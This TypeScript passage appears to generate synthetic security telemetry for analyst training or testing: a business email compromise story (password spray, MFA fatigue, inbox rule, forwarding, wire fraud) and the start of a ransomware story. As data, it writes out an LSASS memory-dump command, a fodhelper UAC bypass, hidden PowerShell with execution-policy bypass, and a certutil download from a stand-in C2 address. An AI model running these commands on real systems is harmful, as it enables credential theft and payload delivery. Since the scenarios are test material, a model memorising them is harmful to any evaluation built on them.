    "d.kaplan": "D Kaplan", "m.okafor": "M Okafor", "e.fischer": "E Fischer", "k.novak": "K Novak", "s.ibrahim": "S Ibrahim",
  };
  const round1 = ["a.nelson", "r.garcia", "p.johnson", "l.harris", "t.brooks", "d.kaplan", "m.okafor", "e.fischer", "k.novak", "s.ibrahim"];
  const round2 = ["a.nelson", "r.garcia", "l.harris", "t.brooks", "d.kaplan", "m.okafor"];
  const round3 = ["a.nelson", "r.garcia", "l.harris"];
  const attempts = [...round1, ...round2, ...round3];
  const succeeds = (acct: string, k: number) => (acct === "p.johnson" && k < 10) || (acct === "l.harris" && k >= 16);
  const adfsLogon = (k: number, acct: string): TelemetryEvent => {
    const ok = succeeds(acct, k);
    const ts = T(5 * SEC + k * 12 * SEC);
    const common = {
      "winlog.channel": "Security",
      "winlog.computer_name": "SRV-ADFS01",
      "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
      "winlog.event_data.TargetUserName": acct,
      "winlog.event_data.TargetDomainName": "NEXACORP",
      "winlog.event_data.LogonType": "3",
      // AD FS forms authentication calls LogonUser from its service host: no client address on the record
      // (the client address lives in the firewall row and the AD FS audit log).
      "winlog.event_data.LogonProcessName": "Advapi  ",
      "winlog.event_data.AuthenticationPackageName": "Negotiate",
      "winlog.event_data.WorkstationName": "SRV-ADFS01",
      "winlog.event_data.ProcessName": "C:\\Windows\\ADFS\\Microsoft.IdentityServer.ServiceHost.exe",
      "winlog.event_data.IpAddress": "-",
      "winlog.event_data.IpPort": "-",
    };
    return ok ? {
      id: `evt_01_spray_${String(k + 1).padStart(2, "0")}`, ts,
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: "SRV-ADFS01", user_email: `${acct}@nexacorp.com`, severity: "low",
      description: `SRV-ADFS01 logged a successful network logon for ${acct} through the AD FS service (attempt ${k + 1} of ${attempts.length}, round ${k < 10 ? 1 : k < 16 ? 2 : 3}).`,
      raw: {
        "winlog.event_id": "4624", ...common,
        "winlog.event_data.SubjectUserSid": "S-1-0-0", "winlog.event_data.SubjectUserName": "-", "winlog.event_data.SubjectDomainName": "-",
        "event.code": "4624",
      },
    } : {
      id: `evt_01_spray_${String(k + 1).padStart(2, "0")}`, ts,
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      hostname: "SRV-ADFS01", user_email: `${acct}@nexacorp.com`, severity: k === 0 ? "high" : "medium",
      mitre_technique: k === 0 ? "T1110.003" : undefined,
      description: `SRV-ADFS01 logged a failed logon (bad password) for ${acct} through the AD FS service (attempt ${k + 1} of ${attempts.length}, round ${k < 10 ? 1 : k < 16 ? 2 : 3}).`,
      raw: {
        "winlog.event_id": "4625", ...common,
        // Subject (no authenticated subject for a failed logon)
        "winlog.event_data.SubjectUserSid": "S-1-0-0", "winlog.event_data.SubjectUserName": "-", "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.TargetUserSid": "S-1-0-0",
        // %%2313 = "Unknown user name or bad password" (SubStatus 0xC000006A; %%2312 is "User not allowed to logon at this computer")
        "winlog.event_data.Status": "0xC000006D", "winlog.event_data.SubStatus": "0xC000006A", "winlog.event_data.FailureReason": "%%2313",
        "event.code": "4625",
      },
    };
  };
  const spray = attempts.map((acct, k) => adfsLogon(k, acct));
  // The firewall in front of AD FS: five inbound sessions from the spray address, one after each stretch of attempts.
  const fwSpray = (n: number, ts: string, sport: number, bytesOut: number, bytesIn: number, elapsed: number): TelemetryEvent => ({
    id: `evt_bec_fw_spray_${n}`, ts,
    source: "firewall", vendor: "Palo Alto Networks PAN-OS",
    event_type: "net_connection", severity: n === 1 ? "high" : "medium",
    mitre_technique: n === 1 ? "T1110.003" : undefined,
    src_ip: sprayIp, dst_ip: adfsIp, dst_port: 443, src_port: sport, hostname: "SRV-ADFS01",
    network: { bytes_out: bytesOut, bytes_in: bytesIn },
    description: `The firewall logged an inbound HTTPS session from ${sprayIp}:${sport} to the ADFS extranet endpoint (adfs.nexacorp.com), ${bytesOut} bytes in, ${bytesIn} out, ${elapsed}s.`,
    raw: {
      "event.action": "allow",
      "source.ip": sprayIp,
      "destination.ip": adfsIp,
      "destination.port": "443",
      "destination.host": "adfs.nexacorp.com",
      "pan.app": "ssl",
      "pan.action": "allow",
      "pan.rule": "ALLOW-INBOUND-ADFS",
      "pan.elapsed_time": String(elapsed),
      "source.geo.country_name": "Netherlands",
      "source.geo.city_name": "Amsterdam",
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn),
    },
  });
  const lockout = (id: string, ts: string, acct: string, rec: string): TelemetryEvent => ({
    id, ts,
    source: "ad", vendor: "Windows Security", event_type: "account_lockout",
    user_email: `${acct}@nexacorp.com`, hostname: "DC01",
    severity: "medium",
    description: `DC01 locked out account ${acct}; the caller computer was SRV-ADFS01.`,
    raw: {
      // Windows Security Event 4740 - Account Locked Out
      "winlog.event_id": "4740",
      "winlog.channel": "Security",
      "winlog.computer_name": "DC01",
      "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
      "winlog.record_id": rec,
      // Subject (SYSTEM on DC)
      "winlog.event_data.SubjectUserSid": "S-1-5-18",
      "winlog.event_data.SubjectUserName": "DC01$",
      "winlog.event_data.SubjectDomainName": "NEXACORP",
      "winlog.event_data.SubjectLogonId": "0x3E7",
      // Target account that was locked out; the machine that triggered the lockout is SRV-ADFS01
      "winlog.event_data.TargetUserName": acct,
      "winlog.event_data.TargetDomainName": "NEXACORP",
      "winlog.event_data.CallerComputerName": "SRV-ADFS01",
      "event.code": "4740",
    },
  });

  // ── Entra sign-ins ───────────────────────────────────────────────────────────
  const entra = (o: {
    id: string; ts: string; email: string; display: string; ip: string; code: string; city: string; iso: string; ua?: string; browser?: string; os?: string;
    type: TelemetryEvent["event_type"]; severity: TelemetryEvent["severity"]; corr: string; risk: "high" | "medium" | "none"; managed?: boolean; session?: string;
    desc: string; mitre?: string; ca?: string;
  }): TelemetryEvent => ({
    id: o.id, ts: o.ts,
    source: "o365", vendor: "Microsoft Entra ID", event_type: o.type,
    user_email: o.email, src_ip: o.ip,
    severity: o.severity, mitre_technique: o.mitre,
    ...(o.ua ? { network: { user_agent: o.ua } } : {}),
    description: o.desc,
    raw: {
      "azure.signinlogs.correlation_id": o.corr,
      "azure.signinlogs.resultType": o.code,
      ...(o.code === "0" ? { "azure.signinlogs.result_description": "Successfully signed in" } : {}),
      "azure.signinlogs.app_display_name": "Microsoft 365",
      "azure.signinlogs.client_app_used": "Browser",
      "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
      "azure.signinlogs.conditional_access_status": o.ca ?? (o.code === "0" ? "success" : "failure"),
      "azure.signinlogs.risk_level_aggregated": o.risk,
      "azure.signinlogs.risk_level_during_signin": o.risk,
      ...(o.risk !== "none" ? { "azure.signinlogs.risk_event_types_v2": "unfamiliarFeatures", "azure.signinlogs.risk_state": "atRisk" } : {}),
      "azure.signinlogs.is_interactive": "true",
      "azure.signinlogs.tenant_id": tenant,
      "azure.signinlogs.user_principal_name": o.email,
      "azure.signinlogs.user_display_name": o.display,
      "azure.signinlogs.user_type": "Member",
      ...(o.session ? { "azure.signinlogs.properties.sessionId": o.session } : {}),
      "azure.signinlogs.device_detail.browser": o.browser ?? "Chrome 124.0.0",
      "azure.signinlogs.device_detail.operating_system": o.os ?? "Windows10",
      "azure.signinlogs.device_detail.is_compliant": String(!!o.managed),
      "azure.signinlogs.device_detail.is_managed": String(!!o.managed),
      "azure.signinlogs.location.city": o.city,
      "azure.signinlogs.location.country_or_region": o.iso,
      "source.ip": o.ip,
    },
  });
  const harris = (id: string, ts: string, code: string, corr: number, desc: string, extra: Partial<Parameters<typeof entra>[0]> = {}) =>
    entra({ id, ts, email: victim.email, display: "Laura Harris", ip: attackerIp, code, city: "Amsterdam", iso: "NL", ua: attackerUa, type: code === "0" ? "auth_success" : code === "500121" ? "mfa_denied" : "auth_failure",
      severity: code === "0" ? "critical" : "medium", corr: guid(corr), risk: code === "0" ? "high" : "medium", desc, ...extra });
  const johnsonOffsets = [0, 39, 77, 116, 154, 193, 231, 270];
  const johnson = johnsonOffsets.map((s, i) => entra({
    id: `evt_09_mfa_fatigue_${i + 1}`, ts: T(25 * MIN + 20 * SEC + s * SEC), email: "p.johnson@nexacorp.com", display: "Patricia Johnson", ip: sprayIp,
    code: "500121", city: "Amsterdam", iso: "NL", ua: attackerUa, type: "mfa_denied", severity: i === 0 ? "high" : "medium", mitre: i === 0 ? "T1621" : undefined,
    corr: guid(0xa00 + i), risk: "medium", desc: `p.johnson denied an MFA prompt she did not start (${i + 1} of 8), from ${sprayIp}.`,
  }));

  // ── Mailbox audit (Unified Audit Log) shared context ─────────────────────────
  const ual = {
    "data.office365.OrganizationId": tenant,
    "data.office365.UserId": victim.email,
    "data.office365.ClientIP": attackerIp,
    "data.office365.AppAccessContext.AADSessionId": harrisSession,
    "data.office365.AppAccessContext.IssuedAtTime": "2026-05-08T08:12:04",
  };

  const events: TelemetryEvent[] = [
    ...spray,
    lockout("evt_02_lockout_1", T(5 * SEC + 16 * 12 * SEC + 800), "a.nelson", "1048302"),
    lockout("evt_03_lockout_2", T(5 * SEC + 17 * 12 * SEC + 800), "r.garcia", "1048315"),
    fwSpray(1, T(62 * SEC), 50307, 31_700, 214_000, 56),
    fwSpray(2, T(2 * MIN + 2 * SEC), 50412, 27_900, 189_000, 52),
    fwSpray(3, T(3 * MIN + 1 * SEC), 50523, 22_400, 151_000, 48),
    fwSpray(4, T(4 * MIN + 2 * SEC), 50631, 16_800, 117_000, 41),
    {
      // The SIEM's scheduled analytic over the AD FS Security log and the AD FS audit log.
      id: "evt_bec_spray_alert", ts: T(4 * MIN + 30 * SEC),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "ueba_anomaly",
      hostname: "SRV-ADFS01", src_ip: sprayIp,
      severity: "high", mitre_technique: "T1110.003", is_detection: true,
      description: `Microsoft Sentinel matched the analytic rule 'Failed logons for many accounts from one address' on SRV-ADFS01: 17 failed logons across 10 accounts from ${sprayIp}.`,
      raw: {
        "AlertName": "Failed logons for many accounts from one address",
        "AlertSeverity": "High",
        "ProductName": "Azure Sentinel",
        "ProviderName": "ASI Scheduled Alerts",
        "AlertType": "5d8a2f41-93c6-4e07-b1a8-2c7e90d3f654_a41e7c08-6b2d-4953-8f10-d95e3a2c7b16",
        "Status": "New",
        "Tactics": "CredentialAccess",
        "Techniques": "[\"T1110\"]",
        "CompromisedEntity": "SRV-ADFS01",
        "ExtendedProperties.Query Period": "00:10:00",
        "ExtendedProperties.Number of events": 17,
        "ExtendedProperties.Distinct accounts": 10,
        "ExtendedProperties.Client IP Address": sprayIp,
        "ExtendedProperties.Event ID": "4625",
        "Entities": JSON.stringify([
          { $id: "2", Address: sprayIp, Type: "ip" },
          { $id: "3", HostName: "SRV-ADFS01", DnsDomain: "nexacorp.com", Type: "host" },
          ...Object.keys(accounts).map((a, i) => ({ $id: String(4 + i), Name: a, NTDomain: "NEXACORP", Type: "account" })),
        ]),
      },
    },
    // Laura's sign-in: two denied prompts, then the approval (the Authenticator prompt asks for a number match,
    // which the caller on the phone read out to her).
    harris("evt_04_mfa_prompt_1", T(10 * MIN + 40 * SEC), "50074", 0xb01, `${victim.email} reached the MFA step from ${attackerIp} (Amsterdam): strong authentication required.`),
    harris("evt_04_mfa_prompt_2", T(11 * MIN + 10 * SEC), "500121", 0xb02, `${victim.email} did not complete the first MFA prompt from ${attackerIp}.`),
    harris("evt_04_mfa_prompt_3", T(11 * MIN + 40 * SEC), "500121", 0xb03, `${victim.email} did not complete the second MFA prompt from ${attackerIp}.`),
    harris("evt_04_mfa_accept", T(12 * MIN), "0", 0xb04, `l.harris completed MFA from Amsterdam, Netherlands (${attackerIp}) on an unmanaged Windows device.`,
      { mitre: "T1078", session: harrisSession }),
    // ── First alert: Identity Protection's real-time detection on that sign-in, as it lands in Sentinel ──
    {
      id: "evt_bec_idp_alert", ts: T(12 * MIN + 20 * SEC),
      source: "siem", vendor: "Microsoft Sentinel", event_type: "risk_score_change",
      user_email: victim.email, src_ip: attackerIp,
      severity: "medium", mitre_technique: "T1078", is_detection: true,
      description: `Sentinel received the Identity Protection alert "Unfamiliar sign-in properties" (Medium) for l.harris, source IP ${attackerIp}, unregistered Windows device.`,
      raw: {
        "AlertName": "Unfamiliar sign-in properties",
        "ProductName": "Azure Active Directory Identity Protection",
        "ProviderName": "IPC",
        "AlertSeverity": "Medium",
        "AlertType": "unfamiliarFeatures",
        "Status": "New",
        "Tactics": "InitialAccess",
        "CompromisedEntity": "l.harris@nexacorp.com",
        "StartTime": T(12 * MIN),
        "TimeGenerated": T(12 * MIN + 20_000),
        "Entities": JSON.stringify([
          { $id: "2", Name: "l.harris", UPNSuffix: "nexacorp.com", Type: "account" },
          { $id: "3", Address: attackerIp, Type: "ip" },
        ]),
        "ExtendedProperties.Client IP Address": attackerIp,
        "ExtendedProperties.Client Location": "Amsterdam, North Holland, NL",
        "ExtendedProperties.Detection Timing Type": "realtime",
        "ExtendedProperties.Request Id": guid(0xb04),
      },
    },

    // ── CORRELATED: O365 mailbox access from attacker IP immediately after login ──
    {
      id: "evt_bec_mailbox_access", ts: T(12 * MIN + 30 * SEC),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: attackerIp,
      mitre_technique: "T1114.002",
      description: `l.harris's mailbox was accessed from ${attackerIp} just 30 seconds after the MFA prompt was approved.`,
      raw: {
        "data.office365.Operation": "MailboxLogin",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.ClientIP": attackerIp,
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "data.office365.AppAccessContext.AADSessionId": harrisSession,
        "data.office365.AppAccessContext.IssuedAtTime": "2026-05-08T08:12:04",
        "mail.access_type": "MailboxLogin",
        "mail.folder_accessed": "Inbox",
        "event.action": "MailboxLogin",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "user.email": victim.email,
      },
    },
    {
      id: "evt_05_inbox_rule", ts: T(13 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1564.008",
      description: `A new inbox rule named ".." was created in l.harris's mailbox from ${attackerIp}: emails containing wire or banking are moved to RSS Feeds and marked as read.`,
      raw: {
        // O365 Unified Audit Log - New-InboxRule
        "data.office365.Id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "data.office365.RecordType": "1",
        "data.office365.CreationTime": "2026-05-08T08:13:00Z",
        "data.office365.Operation": "New-InboxRule",
        "data.office365.OrganizationId": tenant,
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "data.office365.UserType": "0",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.ExternalAccess": "false",
        // New-InboxRule cmdlet parameters, as O365 UAL actually records them
        "data.office365.Parameters[0].Name": "Name",
        "data.office365.Parameters[0].Value": "․․",
        "data.office365.Parameters[1].Name": "SubjectOrBodyContainsWords",
        "data.office365.Parameters[1].Value": "[\"wire\",\"invoice\",\"banking\",\"payment\",\"transfer\"]",
        "data.office365.Parameters[2].Name": "MoveToFolder",
        "data.office365.Parameters[2].Value": "RSS Feeds",
        "data.office365.Parameters[3].Name": "MarkAsRead",
        "data.office365.Parameters[3].Value": "True",
        "data.office365.Parameters[4].Name": "StopProcessingRules",
        "data.office365.Parameters[4].Value": "True",
      },
    },
    {
      id: "evt_06_email_scrape", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `340 emails were accessed in l.harris's mailbox within 2 minutes via Outlook Web App from ${attackerIp}.`,
      raw: {
        // O365 Unified Audit Log - MailItemsAccessed (ExchangeItemAggregated)
        "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.RecordType": "50",
        "data.office365.CreationTime": "2026-05-08T08:15:00Z",
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.OrganizationId": tenant,
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.MailboxOwnerUPN": "l.harris@nexacorp.com",
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.AppAccessContext.AADSessionId": harrisSession,
        "data.office365.AppAccessContext.IssuedAtTime": "2026-05-08T08:12:04",
        "data.office365.ExternalAccess": "false",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.IsThrottled": "false",
        // MailItemsAccessed aggregates when the access is a Sync operation -
        // this is the real Microsoft behavior for reducing audit record
        // volume, and OperationCount is the actual field it uses to carry
        // the aggregate (matches the "Bind" vs "Sync" distinction: only Sync
        // batches, so this record must not also claim access_type Bind).
        "data.office365.OperationProperties.MailAccessType": "Sync",
        "data.office365.OperationCount": "340",
        "data.office365.Folders.Path": "\\Inbox, \\Sent Items, \\Drafts",
        // ECS fields
        "event.action": "MailItemsAccessed",
        "event.outcome": "success",
        "user.email": "l.harris@nexacorp.com",
        "source.ip": attackerIp,
        "application.name": "Outlook Web App",
        "session.duration_seconds": "112",
      },
    },
    {
      id: "evt_07_forward_rule", ts: T(20 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.003",
      description: "l.harris's mailbox was configured to auto-forward all incoming email to an external Gmail address (l.harris.backup@gmail.com).",
      raw: {
        // O365 Unified Audit Log - Set-Mailbox (ForwardingSmtpAddress)
        "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.RecordType": "1",
        "data.office365.CreationTime": "2026-05-08T08:20:00Z",
        "data.office365.Operation": "Set-Mailbox",
        "data.office365.OrganizationId": tenant,
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.ObjectId": "l.harris@nexacorp.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        // Set-Mailbox property changes, as O365 UAL actually records them
        "data.office365.ModifiedProperties[0].Name": "ForwardingSmtpAddress",
        "data.office365.ModifiedProperties[0].NewValue": "smtp:l.harris.backup@gmail.com",
        "data.office365.ModifiedProperties[0].OldValue": "",
        "data.office365.ModifiedProperties[1].Name": "DeliverToMailboxAndForward",
        "data.office365.ModifiedProperties[1].NewValue": "True",
        "data.office365.ModifiedProperties[1].OldValue": "False",
      },
    },
    {
      // Exchange Online mail flow: the first message that arrives after the rule is copied to the external address.
      id: "evt_07b_forward_fired", ts: T(21 * MIN + 10 * SEC),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_sent",
      severity: "medium", mitre_technique: "T1114.003",
      description: "A message delivered to l.harris was copied to l.harris.backup@gmail.com, an external address with no earlier mail traffic.",
      raw: {
        "InternetMessageId": "<a41e5c70-7b1f-4d52-8b3c-0d62f9e7a1c4@apexsupplies.co.uk>",
        "email.from.address": "billing@apexsupplies.co.uk",
        "email.to.address": "l.harris.backup@gmail.com",
        "email.subject": "Apex Supplies - Invoice 4471 remittance advice",
        "email.direction": "outbound",
        "data.office365.IsFirstContact": "1",
        "action_result": "delivered",
        "event.action": "EmailDelivered", "event.outcome": "success",
      },
    },
    {
      id: "evt_08_wire_fraud", ts: T(25 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "email_sent",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical",
      description: `l.harris's account sent an email to CFO p.johnson requesting a $247,000 wire transfer to new banking details, replying inside an existing Apex Supplies invoice thread.`,
      raw: {
        // O365 Unified Audit Log - Send is a mailbox-audit action, RecordType 2
        // (ExchangeItem). 28 is ThreatIntelligence (Defender for Office 365 verdicts).
        "data.office365.Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.RecordType": "2",
        "data.office365.CreationTime": "2026-05-08T08:25:00Z",
        "data.office365.Operation": "Send",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@nexacorp.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.AppAccessContext.AADSessionId": harrisSession,
        "data.office365.AppAccessContext.IssuedAtTime": "2026-05-08T08:12:04",
        // Email fields
        "email.message_id": fraudMsgId,
        "email.from.address": "l.harris@nexacorp.com",
        "email.from.display_name": "Laura Harris",
        "email.to.address": "p.johnson@nexacorp.com",
        "email.subject": "RE: Apex Supplies - Urgent payment update",
        "email.direction": "outbound",
        "email.size_bytes": "4217",
        // ECS fields
        "event.action": "EmailSent",
        "event.outcome": "success",
        "source.ip": attackerIp,
      },
    },
    {
      // The mail-flow record of the same message names the recipient the audit record leaves out.
      id: "evt_08b_fraud_delivered", ts: T(25 * MIN + 2 * SEC),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: "p.johnson@nexacorp.com",
      severity: "high",
      description: "A message from l.harris to p.johnson (RE: Apex Supplies, Urgent payment update) was delivered to the CFO's inbox.",
      raw: {
        "InternetMessageId": fraudMsgId,
        "email.from.address": "l.harris@nexacorp.com",
        "email.from.display_name": "Laura Harris",
        "email.to.address": "p.johnson@nexacorp.com",
        "email.subject": "RE: Apex Supplies - Urgent payment update",
        "email.direction": "intra-org",
        "action_result": "delivered",
        "event.action": "EmailDelivered", "event.outcome": "success",
      },
    },
    ...johnson,
    {
      // The CFO phones the help desk: the ticket that opens the case.
      id: "evt_10_helpdesk_ticket", ts: T(31 * MIN),
      source: "soar", vendor: "ServiceNow ITSM", event_type: "policy_modification",
      user_email: "p.johnson@nexacorp.com", severity: "informational",
      description: "p.johnson phoned the help desk about unexpected authentication prompts; incident INC0048217 was opened.",
      raw: {
        "servicenow.table": "incident",
        "servicenow.number": "INC0048217",
        "servicenow.state": "New",
        "servicenow.short_description": "Unexpected authentication prompts on my phone",
        "servicenow.caller_id": "p.johnson@nexacorp.com",
        "servicenow.opened_by": "h.sato@nexacorp.com",
        "servicenow.opened_at": "2026-05-08 08:31:00",
        "servicenow.contact_type": "phone",
        "servicenow.category": "security",
        "servicenow.impact": "2 - Medium",
        "servicenow.urgency": "2 - Medium",
        "servicenow.assignment_group": "Service Desk",
        "servicenow.work_notes": "Caller (CFO) reports several Authenticator approval prompts on her phone that she did not start; she denied all of them. Passed to the SOC.",
      },
    },

    // ── Baseline: l.harris on a normal morning, in the office, on her managed laptop ──
    {
      id: "evt_10_benign_browse", ts: T(-30 * MIN), is_baseline: true,
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: victim.email, hostname: victim.hostname, src_ip: egress, dst_ip: "151.101.64.81",
      severity: "informational",
      network: { url: "https://www.bbc.co.uk/news", method: "GET", status: 200, bytes_out: 1_240, bytes_in: 187_000, user_agent: officeUa },
      description: "l.harris read the news from LAPTOP-FIN-04 before work.",
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": "l.harris",
        "zscaler.cip": victim.ip,
        "zscaler.urlcategory": "News and Media",
        "zscaler.reqmethod": "GET",
        "user.email": "l.harris@nexacorp.com",
        "source.hostname": "LAPTOP-FIN-04",
      },
    },
    {
      id: "evt_bec_baseline_ad", ts: T(-20 * MIN), is_baseline: true,
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      description: "l.harris logged on interactively to LAPTOP-FIN-04 from the office network.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": victim.hostname,
        "winlog.event_data.IpAddress": victim.ip,
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.TargetUserName": "l.harris",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": victim.ip,
        "host.name": victim.hostname,
      },
    },
    entra({
      id: "evt_bec_baseline_entra", ts: T(-18 * MIN), email: victim.email, display: "Laura Harris", ip: victim.ip, code: "0", city: "London", iso: "GB",
      type: "auth_success", severity: "informational", corr: guid(0xb00), risk: "none", managed: true, ca: "success",
      browser: "Chrome 140.0.0", os: "Windows10", ua: officeUa,
      desc: "l.harris signed in to Microsoft 365 from the office network on her managed laptop.",
    }),
  ];
  events.forEach(e => { if (e.id === "evt_bec_baseline_entra") e.is_baseline = true; });
  // Baseline rows sit where the clock puts them; every other row is already in story order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "Failed AD FS logons and a CFO call", events, T, MIN, victim, attackerIp, sprayIp };
}

/** Telemetry half of `buildRansomwareScenario`: the events and the story title, no answer key. */
export function ransomwareScenarioEvents() {
  const B = new Date("2026-05-06T03:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const AT = (day: string, hms: string) => new Date(`2026-05-${day}T${hms}Z`).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One address per host, on every record of that host.
  const zero    = { hostname: "WS-FIN-1193", email: "c.martin@nexacorp.com",  ip: "10.10.20.33" };
  const server  = { hostname: "FS-CORP-01",  email: "da-backup@nexacorp.com", ip: "10.10.10.12" };
  // Story-specific C2 (the 185.220.101.0/24 Tor range was shared across storylines).
  const c2Ip    = "94.131.98.17";
  const c2Dom   = "edge-cdn-updates.xyz";
  const senderIp = "185.246.188.74";
  const rswHash = makeSha256("lockbit3_ransom_payload");
  const psxHash = makeSha256("psexec_lateral_tool");
  const docmHash = makeSha256("salary_adjustment_notice_docm_macro_document");
  const scriptHash = makeSha256("pay_adj_ps1_stage_script");
  const noteHash = makeSha256("restore_my_files_ransom_note");
  const docmPath = "C:\\Users\\c.martin\\Downloads\\Salary_Adjustment_Notice.docm";
  const scriptPath = "C:\\Users\\c.martin\\AppData\\Local\\Temp\\pay_adj.ps1";
  const psPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const wordPath = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE";
  const stageCmd = `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ${scriptPath}`;
  const dumpCmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 704 C:\\Windows\\Temp\\mem.dmp full";
  const payloadPath = "C:\\Windows\\Temp\\wu_update.exe";
  const encExt = ".kDrP4xW9s";
  const cu = "NEXACORP\\c.martin";
  const sys = "NT AUTHORITY\\SYSTEM";

  // Processes of the two hosts (one pid per process instance everywhere it appears).
  const explorerP = { name: "explorer.exe", pid: 3412, path: "C:\\Windows\\explorer.exe", user: cu, integrity: "medium" as const };
  const chromeP = { name: "chrome.exe", pid: 5120, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", parent_name: "explorer.exe", parent_pid: 3412, user: cu, integrity: "medium" as const };
  const wordP = { name: "WINWORD.EXE", pid: 2244, path: wordPath, parent_name: "explorer.exe", parent_pid: 3412, user: cu, integrity: "medium" as const };
  const ps1P = { name: "powershell.exe", pid: 7741, path: psPath, parent_name: "WINWORD.EXE", parent_pid: 2244, cmdline: stageCmd, user: cu, integrity: "medium" as const };
  const fodP = { name: "fodhelper.exe", pid: 6120, path: "C:\\Windows\\System32\\fodhelper.exe", parent_name: "powershell.exe", parent_pid: 7741, cmdline: "fodhelper.exe", user: cu, integrity: "high" as const };
  const ps2P = { name: "powershell.exe", pid: 8216, path: psPath, parent_name: "fodhelper.exe", parent_pid: 6120, cmdline: stageCmd, user: cu, integrity: "high" as const };
  const dumpP = { name: "rundll32.exe", pid: 9914, path: "C:\\Windows\\System32\\rundll32.exe", parent_name: "powershell.exe", parent_pid: 8216, cmdline: dumpCmd, user: cu, integrity: "high" as const };
  const psexeP = { name: "PSEXESVC.exe", pid: 3310, path: "C:\\Windows\\PSEXESVC.exe", parent_name: "services.exe", parent_pid: 728, cmdline: "C:\\Windows\\PSEXESVC.exe", user: sys, integrity: "system" as const, hash: { sha256: psxHash } };
  const certutilP = { name: "certutil.exe", pid: 4162, path: "C:\\Windows\\System32\\certutil.exe", parent_name: "PSEXESVC.exe", parent_pid: 3310,
    cmdline: `certutil.exe -urlcache -split -f http://${c2Ip}/wu.bin ${payloadPath}`, user: sys, integrity: "system" as const };
  const lockP = { name: "wu_update.exe", pid: 9120, path: payloadPath, parent_name: "PSEXESVC.exe", parent_pid: 3310, cmdline: payloadPath, user: sys, integrity: "system" as const, hash: { sha256: rswHash } };

  // ── record builders ──────────────────────────────────────────────────────────
